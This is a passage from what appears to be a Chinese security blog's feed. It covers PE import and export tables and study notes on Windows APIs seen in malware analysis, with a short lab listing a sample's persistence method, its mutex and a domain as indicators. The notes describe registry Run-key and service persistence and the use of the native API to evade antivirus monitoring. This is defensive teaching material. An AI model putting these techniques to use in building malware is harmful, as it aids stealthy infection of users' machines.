title="IAT"></a>IAT</h2><p>一个普通PE文件的运行往往需要导入多个库文件，在PE文件运行时如何找到库文件中函数的准确入口是程序正确运行的保证。IAT就是提供这样保证的一个机制。IAT总得来说是一张表，表内存储着每个库文件函数在内存中的地址。<br>结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></div><div class="line">    <span class="keyword">union</span> &#123;</div><div class="line">        DWORD   Characteristics;            <span class="comment">//导入表结束标志</span></div><div class="line">        DWORD   OriginalFirstThunk;         <span class="comment">//RVA指向一个结构体数组(INT表)</span></div><div class="line">    &#125;;</div><div class="line">    DWORD   TimeDateStamp;                  <span class="comment">//时间戳</span></div><div class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></div><div class="line">    DWORD   Name;                           <span class="comment">//RVA指向dll名字，以0结尾</span></div><div class="line">    DWORD   FirstThunk;                     <span class="comment">//RVA指向一个结构体数组(IAT表)</span></div><div class="line">&#125; IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;</div></pre></td></tr></table></figure></p><p>第一个成员是一个联合体：一般给出的是OriginalFirstThunk的值，这个值是INT的地址，INT（Import Name Table）是一个存储了库文件函数名称的表<br>第二个成员是时间戳<br>第三个成员是ForwarderChain<br>第四个成员是Name，存储的是库名称字符数组的地址<br>第五个成员是FirstThunk，存储的是IAT表的地址</p><p>第一步：<br>PE加载器读取结构体成员的值，Name成员找到库名称，然后将库文件加载到内存中来。<br>第二步：<br>PE加载器读取OriginalFirstThunk值获得INT地址，然后依次读取INT各项的值，根据函数的标号获取函数的地址<br>第三步：<br>根据FirstThunk的值获取IAT的地址，将上一步获得地址送入IAT中存储。</p><p>理解:读取IID(结构体)成员name获取库名-&gt;load(库)-&gt;读取IID的成员，获取INT的地址-&gt;读取函数名并获取地址-&gt;读取IID的成员，获取IAT的地址-&gt;将得到函数地址存入IAT中-&gt;重复直到INT为NULL</p><h2 id="EAT"><a href="#EAT" class="headerlink" title="EAT"></a>EAT</h2><p>EAT对应的结构体为IMAGE_EXPORT_DESCRIPTOR，位置信息存储在可选头DataDirectory[0]中。<br>一般PE文件此项值应为0，代表不存在这个表项，只有库文件，才会含有这个表项。<br>结构体成员包括特征值，时间戳，版本信息等。重要的成员是Name，存储着库文件的名字；Base存储着函数标号从哪里开始；NumberOfFunctions存储着函数的数量；NumberOfNames存储着函数名称的数量（一般情况下这两项相同）；AddressOfFunctions函数地址数组的首地址；AddressOfNames函数名称地址数组的首地址；AdressOfNameOrdinals，存储着函数标号的地址信息。</p><p>个人思考:记得以前学习的时候，把VA与VirtualAddress看成一个相同的，导致转化的时候很矛盾，现在再看，真是自己可以静心好好的学，再次理解IAT的运行机制。</p><p>参考：<br><a href="https://www.jianshu.com/p/af9766222816" target="_blank" rel="external">https://www.jianshu.com/p/af9766222816</a><br><a href="https://www.cnblogs.com/aguoshaofang/p/5021759.html" target="_blank" rel="external">https://www.cnblogs.com/aguoshaofang/p/5021759.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复习可执行文件的文件结构——PE。PE文件是微软Windows操作系统上的程序文件，意为可移植的可执行的文件。PE的段头直接沿用的COFF 的段头结构。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析———分析恶意Windows-API</title>
    <link href="http://yoursite.com/2018/05/09/re_evil_3/"/>
    <id>http://yoursite.com/2018/05/09/re_evil_3/</id>
    <published>2018-05-09T03:52:41.268Z</published>
    <updated>2018-05-08T04:05:06.601Z</updated>
    
    <content type="html"><![CDATA[<p>多数恶意代码以Windows平台为目标，并且与操作系统进行紧密交互。对基本Windoows编程概念的深刻理解会帮助你识别出恶意代码在主机上的感染迹象，跟踪恶意代码的执行(因为它们可能使用操作系统来执行代码而不是用一个跳转或调用指令)，并最终分析出恶意代码的目的。<br><a id="more"></a></p><h1 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h1><p>Windows API是一个广泛的功能集合，管理着恶意代码与微软程序库之间的交互方式。Windows API使用特定术语，名字，已经约定。</p><h2 id="类型和匈牙利表达法"><a href="#类型和匈牙利表达法" class="headerlink" title="类型和匈牙利表达法"></a>类型和匈牙利表达法</h2><p>多数Windows API使用它自己的 名字，来表示C语言类型。Windows总体上使用匈牙利表达法，作为API函数标识符，这个表达式 使用一个前缀命名模式<br>windows API中的常见类型<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">类型和前缀                    描述</div><div class="line">WORD(w) 一个<span class="number">16</span>位的无符号数值</div><div class="line">DWORD(dw) 一个双字节，<span class="number">32</span>位的无符号数值</div><div class="line">Handles(H) 一个对象索引</div><div class="line">Long Pointer(L) 一个指向另一类型的指针</div><div class="line">Callback表示一个将会被Windows API调用的函数</div></pre></td></tr></table></figure></p><h2 id="句柄-HANDLE"><a href="#句柄-HANDLE" class="headerlink" title="句柄(HANDLE)"></a>句柄(HANDLE)</h2><p>句柄是在操作系统中被打开或被创建的项。你对句柄做的唯一的事情，就是保存它，并在后续函数调用中使用它来引用同一对象。<br>例:CreateWindowEx函数是一个句柄的简单例子。他返回一个HWND,这是一个窗口句柄。任何时候当你想要对那个窗口做些什么，比如调用DestroyWindows函数是，你就需要使用这个窗口。</p><h2 id="文件系统函数"><a href="#文件系统函数" class="headerlink" title="文件系统函数"></a>文件系统函数</h2><p>恶意代码与系统交互的一个最常用的方式就是创建或修改文件，而且独特文件名或修改为既有的文件名是明显的基于主机的感染现象。</p><h3 id="CreateFile"><a href="#CreateFile" class="headerlink" title="CreateFile"></a>CreateFile</h3><p>这个函数被用来创建和打开文件。它可以打开已经存在的文件，管道，流，以及I/O设备。还能创建新的文件。<br>函数结构体<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(  </span></span></div><div class="line"><span class="function"><span class="params">LPCTSTR,lpFileName,     <span class="comment">//指向文件名的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwDesiredAccess,  <span class="comment">//访问模式（读/写）  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwShareMode,       <span class="comment">//共享模式  </span></span></span></div><div class="line"><span class="function"><span class="params">LPSECURITY_ATTRIBUTES lpSecurityAttributes,<span class="comment">//指向安全属性的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwCreationDisposition,               <span class="comment">//如何让创建  </span></span></span></div><div class="line"><span class="function"><span class="params">DWORD dwFlagAndAttributes,                 <span class="comment">//文件属性  </span></span></span></div><div class="line"><span class="function"><span class="params">HANDLE hTemplateFile                       <span class="comment">//用于复制文件句柄  </span></span></span></div><div class="line">)；</div></pre></td></tr></table></figure></p><h3 id="ReadFile和WriteFile"><a href="#ReadFile和WriteFile" class="headerlink" title="ReadFile和WriteFile"></a>ReadFile和WriteFile</h3><p>这两个函数用来对文件进行读写<br>ReadFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">ReadFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">    HANDLE hFile,                                    <span class="comment">//文件的句柄</span></span></span></div><div class="line"><span class="function"><span class="params">    LPVOID lpBuffer,                                <span class="comment">//用于保存读入数据的一个缓冲区</span></span></span></div><div class="line"><span class="function"><span class="params">    DWORD nNumberOfBytesToRead,    <span class="comment">//要读入的字节数</span></span></span></div><div class="line"><span class="function"><span class="params">    LPDWORD lpNumberOfBytesRead,    <span class="comment">//指向实际读取字节数的指针</span></span></span></div><div class="line"><span class="function"><span class="params">    LPOVERLAPPED lpOverlapped</span></span></div><div class="line"><span class="function"><span class="params">    <span class="comment">//如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。</span></span></span></div><div class="line"><span class="function"><span class="params">    <span class="comment">//该结构定义了一次异步读取操作。否则，应将这个参数设为NULL</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><p>WriteFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HANDLE  hFile,<span class="comment">//文件句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPCVOID lpBuffer,<span class="comment">//数据缓存区指针</span></span></span></div><div class="line"><span class="function"><span class="params">DWORD   nNumberOfBytesToWrite,<span class="comment">//你要写的字节数</span></span></span></div><div class="line"><span class="function"><span class="params">LPDWORD lpNumberOfBytesWritten,<span class="comment">//用于保存实际写入字节数的存储区域的指针</span></span></span></div><div class="line"><span class="function"><span class="params">LPOVERLAPPED lpOverlapped<span class="comment">//OVERLAPPED结构体指针</span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="CreateFileMapping和MapViewofFile"><a href="#CreateFileMapping和MapViewofFile" class="headerlink" title="CreateFileMapping和MapViewofFile"></a>CreateFileMapping和MapViewofFile</h3><p>文件映射经常被恶意代码作者使用，因为它们允许讲一个文件加载到内存中，以便更加容易地进行操作。CreateFileMapping函数负责从磁盘上加载一个文件到内存。MapViewofFile函数则返回一个指向映射的基地址指针，它可以被用来访问内存中的文件。<br>CreateFileMapping函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE WINAPI <span class="title">CreateFileMapping</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">_In_HANDLE hFile,</span></span></div><div class="line"><span class="function"><span class="params">_In_opt_LPSECURITY_ATTRIBUTES lpAttributes,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD flProtect,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD dwMaximumSizeHigh,</span></span></div><div class="line"><span class="function"><span class="params">_In_DWORD dwMaximumSizeLow,</span></span></div><div class="line"><span class="function"><span class="params">_In_opt_LPCTSTR lpName</span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><p>MapViewofFile函数结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFile</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">　　__in HANDLE hFileMappingObject,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwDesiredAccess,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetHigh,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetLow,</span></span></div><div class="line"><span class="function"><span class="params">　　__in SIZE_T dwNumberOfBytesToMap</span></span></div><div class="line"><span class="function"><span class="params">　　)</span></span>;</div><div class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFileEx</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">　　__in HANDLE hFileMappingObject,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwDesiredAccess,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetHigh,</span></span></div><div class="line"><span class="function"><span class="params">　　__in DWORD dwFileOffsetLow,</span></span></div><div class="line"><span class="function"><span class="params">　　__in SIZE_T dwNumberOfBytesToMap,</span></span></div><div class="line"><span class="function"><span class="params">　　__in LPVOID lpBaseAddress</span></span></div><div class="line"><span class="function"><span class="params">　　)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h3><p>Windows系统中有一些特殊文件类型，它们的访问方式与普通文件不太一样。恶意程序经常使用特殊文件。比如:一下特殊文件比普通文件更隐蔽，因为它们在列出目录时不会显示出来，某些特殊文件可以提取对系统硬件和内部数据更强的访问能力。</p><h2 id="Windows注册表"><a href="#Windows注册表" class="headerlink" title="Windows注册表"></a>Windows注册表</h2><p>Windows注册表被用来保存操作系统与程序配置信息，比如设置和选项，和文件系统一样，它是基于主机的感染迹象的很好来源，并且能够揭示出关于恶意代码功能的有用信息。Windows的早期版本使用.ini文件来保存配置信息。注册表被引入后，作为一个层次逐步提升。现在几乎所有的Windows配置信息都保存在注册表中，包括网络驱动，启动项，用户账户，以及其他信息。<br>恶意代码经常使用注册表来完成持久驻留或者存储配置数据。恶意代码添加项到注册表中，这使它在计算机引导时能够自动运行。</p><h3 id="你需要知道几个重要的注册表术语"><a href="#你需要知道几个重要的注册表术语" class="headerlink" title="你需要知道几个重要的注册表术语"></a>你需要知道几个重要的注册表术语</h3><p>根键: 注册表被划分为称为根键的5个顶层节。有时，术语HKEY和储巢也被使用。每一个跟键有一个特定的目的。<br>子键: 一个子键就像一个文件夹中的子文件夹<br>键: 一个键是一个注册表中的文件夹，它可以包含额外的文件夹或键值。跟健和子键都是键。<br>值项: 一个值项是一个配对的名字和值。<br>值或数据: 值或数据是存储在注册表项中的数据。</p><h3 id="注册表根键"><a href="#注册表根键" class="headerlink" title="注册表根键"></a>注册表根键</h3><p>注册表被划分成下面5个键:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HEKY_LOCAL_MACHINE(HKLM) 保存对本地机器全局设置</div><div class="line">HEKY_CURRENT_USER(HKCU)  保存当前用户特定的设置</div><div class="line">HEKY_CLASSES_ROOT  保存定义的类型信息</div><div class="line">HEKY_CURRENT_CONFIG 保存关于当前硬件配置的设置</div><div class="line">HEKY_USERS 定义默认用户，新用户和当前用户的配置</div></pre></td></tr></table></figure></p><p>最常用的根键是HKLM和HKCU。</p><h3 id="注册表编辑器-Regedit"><a href="#注册表编辑器-Regedit" class="headerlink" title="注册表编辑器(Regedit)"></a>注册表编辑器(Regedit)</h3><p>注册表编辑器(Regedit)是windows内建的用来查看和编辑注册表的工具。</p><h3 id="自启动程序"><a href="#自启动程序" class="headerlink" title="自启动程序"></a>自启动程序</h3><p>向run子健中写入项，是一个普定设置程序自启动的方法，尽管不是一个隐蔽的技术，它任然经常被恶意代码用来自启动自身程序。(Autoruns工具可以使用)</p><h3 id="常用注册表函数"><a href="#常用注册表函数" class="headerlink" title="常用注册表函数"></a>常用注册表函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">RegOpenKeyEx 打开一个注册表进行编辑和查询(有些函数例外，大多数还是会使用的)。</div><div class="line">RegSetValueEx 添加一个新值到注册表，并设置它的数值。</div><div class="line">RegGetValue   返回注册表中一个值项的数值</div></pre></td></tr></table></figure><h2 id="网络API"><a href="#网络API" class="headerlink" title="网络API"></a>网络API</h2><h3 id="伯克利兼容套接字"><a href="#伯克利兼容套接字" class="headerlink" title="伯克利兼容套接字"></a>伯克利兼容套接字</h3><p>在Windows的网络选项中，恶意代码最普遍使用的是伯克利兼容套接字，在UNIX也是一样的。伯克利兼容套接字的网络功能在Windows系统中是由Winsock库实现的，主要在ws32_32.dll中，在所有库函数中，socket,connect,bind,listen,accept,send和recv函数最常用的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">socket创建一个套接字</div><div class="line">bind将一个套接字绑定到特定端口，应该在accept前调用</div><div class="line">listen准备着一个套接字将进入监听，等待入站连接</div><div class="line">accept向一个远程套接字打开一个连接，并接受连接</div><div class="line">connect向一个远程套接字打开一个连接，远程套接字必须在等待连接</div><div class="line">recv 从远程套接字接收数据</div><div class="line">send发送数据到远程套接字</div></pre></td></tr></table></figure></p><h2 id="跟踪恶意代码的运行"><a href="#跟踪恶意代码的运行" class="headerlink" title="跟踪恶意代码的运行"></a>跟踪恶意代码的运行</h2><h3 id="动态链接库-DLL"><a href="#动态链接库-DLL" class="headerlink" title="动态链接库(DLL)"></a>动态链接库(DLL)</h3><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件<br>恶意代码作者使用DLL的三种方式:</p><h4 id="保存恶意代码"><a href="#保存恶意代码" class="headerlink" title="保存恶意代码"></a>保存恶意代码</h4><p>有时候将恶意代码保存到一个DLL文件比exe文件更加有利。它可以附加到其他进程</p><h4 id="通过使用Windows-DLL"><a href="#通过使用Windows-DLL" class="headerlink" title="通过使用Windows DLL"></a>通过使用Windows DLL</h4><p>可以通过windows调用dll的程序</p><h4 id="通过使用第三方的DLL"><a href="#通过使用第三方的DLL" class="headerlink" title="通过使用第三方的DLL"></a>通过使用第三方的DLL</h4><p>因为是动态链接，所以可以使用第三方的DLL</p><h4 id="DLL的结构"><a href="#DLL的结构" class="headerlink" title="DLL的结构"></a>DLL的结构</h4><p>dll的文件结构几乎和exe文件一模一样，只有一个单一的标志指示这是dll。DLL经常有更多的导出函数，并且导入函数较少。</p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>恶意代码可以通过创建一个新的进程或修改一个已存在的进程，来执行恶意代码。<br>创建一个新的进程需要用到这个函数CreateProcess，下面是代码范例:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"> <span class="function">BOOL <span class="title">CreateProcess</span><span class="params">(  </span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpApplicationName, <span class="comment">// 应用程序名称  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPTSTR lpCommandLine, <span class="comment">// 命令行字符串  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// 进程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// 线程的安全属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　BOOL bInheritHandles, <span class="comment">// 是否继承父进程的属性  </span></span></span></div><div class="line"><span class="function"><span class="params">　DWORD dwCreationFlags, <span class="comment">// 创建标志  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPVOID lpEnvironment, <span class="comment">// 指向新的环境块的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPCTSTR lpCurrentDirectory, <span class="comment">// 指向当前目录名的指针  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPSTARTUPINFO lpStartupInfo, <span class="comment">// 传递给新进程的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">　LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// 新进程返回的信息  </span></span></span></div><div class="line"><span class="function"><span class="params">)</span></span>;</div></pre></td></tr></table></figure></p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>进程是执行代码的容器，线程才是Windows操作系统真正要执行的内容。<br>创建一个新的线程CreateThread</p><h3 id="使用互斥量-mutex-的进程间协作"><a href="#使用互斥量-mutex-的进程间协作" class="headerlink" title="使用互斥量(mutex)的进程间协作"></a>使用互斥量(mutex)的进程间协作</h3><p>互斥量是全局对象，用于协调多个进程和线程。主要用于控制共享资源的访问，并且经常被恶意代码使用(因为它们经常使用硬编码)。因为如果一个互斥量被两个不使用其它方式通讯的进程使用时，它的名字必须是互斥一致的。<br>一个互斥量可以通过CreateMutex函数进行创建，而进程可以通过OpenMutex调用来获取另一个进程中互斥量的句柄。线程通过一个对WaitForSingleObject的调用，获取对互斥量的访问，当一个线程完成对互斥量的使用后，需要使用ReleaseMutex</p><h2 id="内核与用户模式"><a href="#内核与用户模式" class="headerlink" title="内核与用户模式"></a>内核与用户模式</h2><p>Windows使用两种处理器特权级别:内核模式与用户模式。<br>依据处理器上执行的代码的类型，处理器在两个模式之间切换。应用程序在用户模式下执行。核心操作系统组件在内核模式下执行。多个驱动程序在内核模式下执行，但某些驱动程序在用户模式下执行。<br>用户模式：不能直接访问硬件，应用程序的虚拟地址空间除了为专用空间以外。还会受到限制。在用户模式下执行的处理器无法訪问为该操作系统保留的虚拟地址。限制用户模式应用程序的虚拟地址空间可防止应用程序更改而且可能损坏关键的操作系统数据。<br>内核模式: 内核模式下执行的全部代码都共享单个虚拟地址空间。这表示内核模式驱动程序未从其它驱动程序和操作系统自身独立开来。</p><h2 id="原生态API"><a href="#原生态API" class="headerlink" title="原生态API"></a>原生态API</h2><p>原生态API是用来和Windows进行交互的底层API,他们很少被非恶意软件使用，但是在恶意代码作者之间却很受欢迎。调用原生API函数可以绕过普通Windows API。<br>当调用Windows API中的一个函数时，这个函数通常不会直接执行请求的动作，因为大多数重要的数据结构都会被保存在内核中。这时用户程序被给予对用户API(如:DLL)的访问，这些DLL会调用ntdll.dll，这是一个特殊的DLL程序，它管理用户空间与内核的 交互。然后处理器却换到内核模式，并执行内核中的一个函数。这里ntdll函数像内核中的函数一样，使用API和结构体，这些函数组成了原生API。应用程序不建议调用原生API,但是操作系统中没有任何东西来阻止它们这样做。所有直接调用原生API对恶意代码作者来说很有吸引力，因为原生态API允许它们做一些采用别的方式不可能做到的事情，同时有时候很隐蔽(比如:一些反病毒软件是监控一个进程使用的系统调用，这里就可以躲避啦)。</p><h2 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h2><h3 id="这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行"><a href="#这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行" class="headerlink" title="这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行"></a>这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行</h3><p>发现两个函数:<br><img src="https://i.imgur.com/KkNhcak.png" alt=""><br>其中一个是StartServiceCtrlDispatcherA——&gt;在2000/XP等基于NT 的操作系统中，有一个服务管理器，它管理的后台进程被称为 service。在任务管理器中，并且随系统启动而最先运行，随系统关闭而最后停止。</p><h3 id="为什么程序会使用一个互斥量"><a href="#为什么程序会使用一个互斥量" class="headerlink" title="为什么程序会使用一个互斥量"></a>为什么程序会使用一个互斥量</h3><p>用于控制共享资源的访问</p><h3 id="可以用来检测这个程序的基于主机特征是什么？"><a href="#可以用来检测这个程序的基于主机特征是什么？" class="headerlink" title="可以用来检测这个程序的基于主机特征是什么？"></a>可以用来检测这个程序的基于主机特征是什么？</h3><p>使用Malservice与HGL345的互斥量，发现恶意域名:<a href="http://www.malwareanalysisbook.com" target="_blank" rel="external">http://www.malwareanalysisbook.com</a></p><h3 id="检测这个恶意代码基于网络特征是什么？"><a href="#检测这个恶意代码基于网络特征是什么？" class="headerlink" title="检测这个恶意代码基于网络特征是什么？"></a>检测这个恶意代码基于网络特征是什么？</h3><p>发现恶意域名:<a href="http://www.malwareanalysisbook.com。并且调用InternetOpenUrlA网络函数" target="_blank" rel="external">http://www.malwareanalysisbook.com。并且调用InternetOpenUrlA网络函数</a></p><h3 id="这个程序的目的是什么"><a href="#这个程序的目的是什么" class="headerlink" title="这个程序的目的是什么"></a>这个程序的目的是什么</h3><p>开机自启动，并且访问域名<a href="http://www.malwareanalysisbook，同时有WriteFile函数，可以写文件" target="_blank" rel="external">http://www.malwareanalysisbook，同时有WriteFile函数，可以写文件</a></p><h3 id="这个程序什么时候完成执行"><a href="#这个程序什么时候完成执行" class="headerlink" title="这个程序什么时候完成执行"></a>这个程序什么时候完成执行</h3><p>关机即结束</p><h1 id="API实战"><a href="#API实战" class="headerlink" title="API实战"></a>API实战</h1><h2 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox"></a>MessageBox</h2><p>MessageBox指的是显示一个模态对话框<br>函数定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MessageBox</span><span class="params">(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType)</span></span>;</div><div class="line"></div><div class="line">hWnd：</div><div class="line">此参数代表消息框拥有的窗口。如果为<span class="literal">NULL</span>，则消息框没有拥有窗口。</div><div class="line">lpText：</div><div class="line">消息框的内容。如果使用了Unicode库，则把文本变成：  </div><div class="line">lpCaption：</div><div class="line">消息框的标题。如果使用了Unicode库，则把文本变成</div><div class="line">uType：</div><div class="line">指定一个决定对话框的内容和行为的位标志集。此参数可以为下列标志组中标志的组合。指定下列标志中的一个来显示消息框中的按钮以及图标。</div></pre></td></tr></table></figure></p><p>使用<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MessageBox(<span class="literal">NULL</span>,<span class="string">L"显示的字"</span>,<span class="string">L"标题"</span>,MB_RETRYCANCEL);<span class="comment">//L宏来传递字符串   MB_RETRYCANCEL按钮数量</span></div></pre></td></tr></table></figure></p><h2 id="GetWindowText"><a href="#GetWindowText" class="headerlink" title="GetWindowText"></a>GetWindowText</h2><p>Windows API宏，在WinUser.h中根据是否已定义Unicode被分别定义为GetWindowTextW和GetWindowTextA。该函数将指定窗口的标题条文本（如果存在）拷贝到一个缓存区内。如果指定的窗口是一个控件，则拷贝控件的文本。<br>函数定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">Int <span class="title">GetWindowText</span><span class="params">(HWND hWnd,LPTSTR lpString,Int nMaxCount)</span></span>;</div><div class="line"></div><div class="line"></div><div class="line">GetWindowText(</div><div class="line">  hWnd: HWND;        &#123;窗口句柄&#125;</div><div class="line">  lpString: PChar;   &#123;接收文本的缓冲区的指针&#125;</div><div class="line">  nMaxCount: Integer &#123;指定缓冲区大小, 其中包含<span class="literal">NULL</span>字符; 如果文本超出，会被被截断&#125;</div><div class="line">): Integer;          &#123;返回字符个数, 不包括中断的空字符; 如果标题为空或句柄无效, 则返回零&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;多数恶意代码以Windows平台为目标，并且与操作系统进行紧密交互。对基本Windoows编程概念的深刻理解会帮助你识别出恶意代码在主机上的感染迹象，跟踪恶意代码的执行(因为它们可能使用操作系统来执行代码而不是用一个跳转或调用指令)，并最终分析出恶意代码的目的。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF中的解密</title>
    <link href="http://yoursite.com/2018/05/09/misc_mima/"/>
    <id>http://yoursite.com/2018/05/09/misc_mima/</id>
    <published>2018-05-09T03:52:41.268Z</published>
    <updated>2018-05-02T02:38:31.351Z</updated>
    
